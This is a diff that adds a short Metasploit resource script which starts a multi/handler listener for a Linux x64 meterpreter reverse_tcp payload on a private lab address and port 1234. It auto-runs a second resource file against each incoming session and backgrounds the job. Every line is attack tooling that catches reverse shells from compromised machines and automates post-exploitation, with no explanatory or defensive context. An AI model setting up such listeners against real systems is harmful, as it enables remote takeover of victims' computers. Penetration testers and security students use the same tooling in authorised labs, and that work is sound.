@@ -1,0 +1,7 @@
+use exploit/multi/handler
+set payload linux/x64/meterpreter/reverse_tcp
+set lport 1234
+set lhost 10.0.2.5
+set AutoRunScript multi_console_command -r /home/kali/Desktop/auto.rc
+exploit -j
+sleep 5
